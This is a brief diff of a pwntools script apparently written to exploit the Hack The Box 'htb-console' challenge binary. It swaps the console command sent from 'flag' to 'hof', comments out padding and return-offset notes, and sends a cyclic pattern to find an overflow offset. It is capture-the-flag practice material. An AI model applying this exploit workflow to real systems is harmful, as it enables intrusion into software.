@@ -6,9 +6,7 @@ context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/htb-console'
 
-#padding_length = 56
-#ret_offset = -96
-#winner_address = '0x401206'
+#padding_length_flag = 24
 
 elf = context.binary = ELF(executable)
 
@@ -26,12 +24,11 @@ log.info('Create IO')
 #io = remote('', )
 io = process(executable)
 
-log.info('Send Command flag')
-io.sendlineafter('>>', 'flag')
-#io.sendline('flag')
+#log.info('Send Command flag')
+#io.sendlineafter('>>', 'flag')
 
-#log.info('Send Command hof')
-#io.sendlineafter('>> ', 'hof')
+log.info('Send Command hof')
+io.sendlineafter('>> ', 'hof')
 
 payload = cyclic(200)
 
